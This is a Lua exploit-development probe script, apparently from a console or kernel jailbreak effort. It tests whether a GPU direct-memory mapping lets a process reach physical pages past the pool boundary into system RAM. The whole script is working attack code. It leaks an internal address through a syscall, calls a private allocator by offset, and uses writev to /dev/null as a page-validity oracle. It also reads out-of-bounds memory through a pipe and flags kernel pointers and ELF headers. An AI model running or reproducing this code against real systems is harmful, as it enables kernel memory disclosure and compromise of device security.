-- CRASH_CLASS: MODERATE
-- PROBE 533e: Test if device pager extends past GPU pool boundary
--
-- 533d showed writev returns SUCCESS for 6 pages past a 1-page mmap_dmem
-- mapping. But it only tested 6 pages (0-5). The pool ends at 0x150000000
-- which is ~16 pages from our allocation at 0x14FFC0000.
--
-- QUESTION: Does the pager extend PAST 0x150000000 into system RAM?
-- If yes → kernel memory access via device pager extension.
--
-- Method: writev to /dev/null (returns EFAULT on invalid pages, 16 on valid).
-- Test pages 0 through 48 (covering well past the pool boundary).
-- Also try readv via pipe to extract content of any valid past-pool pages.

print("=== PROBE 533e: PAGER BOUNDARY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_write = make_syscall(4)
local sc_writev = make_syscall(121)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_pipe2 = make_syscall(542)
local sc_read = make_syscall(3)

local lk = uint64(0)
do
    local info = memory.alloc(0x200)
    zero(info, 0x200); wd(info, 0x160)
    pcall(function() make_syscall(593)(uint64(0x2001), info) end)
    lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
end
print("lk=" .. q(lk))

local alloc_fn = lk + uint64(0x17EF0)

-- Open /dev/null for writev probe
local devnull_path = memory.alloc(16)
wd(devnull_path, 0x7665642F)      -- /dev
wd(devnull_path + 4, 0x756E2F)    -- /nu
wd(devnull_path + 8, 0x006C6C)    -- ll\0
local ok_o, null_fd = pcall(function()
    return sc_open(uint64(devnull_path), uint64(2), uint64(0))
end)
null_fd = to_num(null_fd)
print("null_fd=" .. null_fd)

-- Allocate at the END of the GPU pool
-- Pool = 0x100000000 to 0x150000000 (5 GB)
-- Allocate 1 page near the end
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))

-- Try to allocate at end of pool
-- search_start near end, search_end = pool end
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14FF80000"), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
local phys_n = to_num(phys)
print("phys=" .. q(phys))

-- Calculate pages to pool boundary
local pool_end = 0x150000000
local pages_to_end = math.floor((pool_end - phys_n) / 0x4000)
print("pages_to_end=" .. pages_to_end)

-- Map with mmap_dmem(628)
local sc_628 = make_syscall(628)
local ok_m, map_va = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64(-1),
        uint64(3), uint64(0), phys)
end)
if not ok_m or to_num(map_va) == 0 or to_num(map_va) == 0xFFFFFFFF then
    print("mmap_dmem FAILED: " .. q(map_va))
    print("=== 533e DONE ===")
    return
end
print("VA=" .. q(map_va))

-- [A] writev probe: test pages 0 through 48
-- Each page is 0x4000 bytes. We test if writev succeeds for each page.
print("")
print("[A] writev probe (pages 0-48)")
print("  pool_boundary at page " .. pages_to_end)

local iov = memory.alloc(16)
local page_size = 0x4000
local first_fail = nil
local last_valid = -1

for pg = 0, 48 do
    local test_addr = map_va + uint64(pg * page_size)
    wq(iov, test_addr)
    wq(iov + 8, uint64(16))

    local ok_w, rv = pcall(function()
        return sc_writev(uint64(null_fd), uint64(iov), uint64(1))
    end)
    local rvn = ok_w and to_num(rv) or -999

    local marker = ""
    if pg == pages_to_end then marker = " <<<< POOL BOUNDARY" end
    if pg == 0 then marker = marker .. " (allocated page)" end

    local phys_est = phys_n + pg * page_size
    local status
    if rvn == 16 then
        status = "VALID"
        last_valid = pg
    elseif rvn == -1 then
        status = "EFAULT"
        if not first_fail then first_fail = pg end
    else
        status = string.format("rv=%d", rvn)
        if not first_fail then first_fail = pg end
    end

    print(string.format("  page %02d (phys~0x%X): %s%s", pg, phys_est, status, marker))

    -- Stop after 4 consecutive failures past the boundary
    if first_fail and pg - first_fail >= 3 and pg > pages_to_end then
        print("  (stopping after 4 consecutive failures past boundary)")
        break
    end
end

print("")
print("last_valid_page=" .. last_valid)
print("first_fail_page=" .. (first_fail or "none"))
print("pages_to_end=" .. pages_to_end)

-- [B] If any pages past boundary are valid, try to READ their content
-- Use pipe trick: write from mapped page into pipe, then read pipe
if last_valid >= pages_to_end then
    print("")
    print("[B] READING PAST-BOUNDARY PAGES")

    local pipe_buf = memory.alloc(16)
    zero(pipe_buf, 16)
    local ok_p, prv = pcall(function()
        return sc_pipe2(uint64(pipe_buf), uint64(0))
    end)
    local pipe_r = rd(pipe_buf)
    local pipe_w = rd(pipe_buf + 4)
    print("  pipe: r=" .. (pipe_r or "nil") .. " w=" .. (pipe_w or "nil"))

    if pipe_r and pipe_w and pipe_r > 0 and pipe_w > 0 then
        for pg = pages_to_end, math.min(last_valid, pages_to_end + 4) do
            local test_addr = map_va + uint64(pg * page_size)

            -- Write 64 bytes from the mapped page into pipe
            wq(iov, test_addr)
            wq(iov + 8, uint64(64))
            local ok_wv, wrv = pcall(function()
                return sc_writev(uint64(pipe_w), uint64(iov), uint64(1))
            end)
            local wrvn = ok_wv and to_num(wrv) or -999

            if wrvn == 64 then
                -- Read from pipe into our buffer
                local rbuf = memory.alloc(64)
                zero(rbuf, 64)
                local ok_rd, rrv = pcall(function()
                    return sc_read(uint64(pipe_r), uint64(rbuf), uint64(64))
                end)
                local rrvn = ok_rd and to_num(rrv) or -999

                if rrvn == 64 then
                    local hex = ""
                    for off = 0, 60, 4 do
                        local d = rd(rbuf + off)
                        if d then
                            if d < 0 then d = d + 0x100000000 end
                            hex = hex .. string.format("%08X ", d)
                        end
                    end
                    local phys_est = phys_n + pg * page_size
                    print(string.format("  page %02d (phys~0x%X): %s", pg, phys_est, hex))

                    -- Check first qword for kernel pointer or ELF
                    local d0 = rd(rbuf)
                    local d1 = rd(rbuf + 4)
                    if d0 and d1 then
                        if d1 and d1 < 0 then d1 = d1 + 0x100000000 end
                        if d1 and d1 >= 0xFFFF8000 and d1 <= 0xFFFFFFFF then
                            print("  *** POSSIBLE KERNEL POINTER ***")
                        end
                        if d0 == 0x464C457F then
                            print("  *** ELF HEADER ***")
                        end
                    end
                else
                    print(string.format("  page %02d: read failed rv=%d", pg, rrvn))
                end
            else
                print(string.format("  page %02d: writev to pipe failed rv=%d", pg, wrvn))
            end
        end

        pcall(function() sc_close(uint64(pipe_r)) end)
        pcall(function() sc_close(uint64(pipe_w)) end)
    end
end

-- [C] Also test: allocate MULTIPLE pages at pool end, see if pager extends further
print("")
print("[C] Multi-page alloc at pool end")
local phys_out2 = memory.alloc(8)
for _, npages in ipairs({4, 16, 64}) do
    local alloc_size = npages * page_size
    wq(phys_out2, uint64(0))
    local ok_a, arv = pcall(function()
        return native.fcall_with_rax(alloc_fn, 0,
            uint64("0x14F000000"), uint64("0x150000000"), uint64(alloc_size),
            uint64(alloc_size), uint64(0), uint64(phys_out2))
    end)
    local p2 = rq(phys_out2)
    local p2n = to_num(p2)
    local dist = p2n > 0 and math.floor((pool_end - p2n) / page_size) or -1
    print(string.format("  alloc %d pages: phys=%s pages_to_end=%d", npages, q(p2), dist))

    if p2n > 0 and p2n < pool_end then
        -- Map it
        local ok_m2, va2 = pcall(function()
            return sc_628(uint64(0), uint64(alloc_size), uint64(-1),
                uint64(3), uint64(0), p2)
        end)
        if ok_m2 and to_num(va2) ~= 0 and to_num(va2) ~= 0xFFFFFFFF then
            -- Probe past allocation
            local alloc_pages = npages
            local past_start = alloc_pages
            local past_end = alloc_pages + 8
            local any_valid = false
            for pg = past_start, past_end do
                local ta = va2 + uint64(pg * page_size)
                wq(iov, ta)
                wq(iov + 8, uint64(16))
                local ok_wv, wrv = pcall(function()
                    return sc_writev(uint64(null_fd), uint64(iov), uint64(1))
                end)
                local rvn = ok_wv and to_num(wrv) or -999
                local s = rvn == 16 and "VALID" or "EFAULT"
                if rvn == 16 then any_valid = true end
                local pest = p2n + pg * page_size
                local bm = pest >= pool_end and " (PAST POOL)" or ""
                print(string.format("    page %02d (phys~0x%X): %s%s", pg, pest, s, bm))
            end
            if not any_valid then
                print("    No extension past allocation")
            end
        else
            print(string.format("    map failed: %s", q(va2)))
        end
    end
end

pcall(function() sc_close(uint64(null_fd)) end)

print("")
print("=== 533e DONE ===")
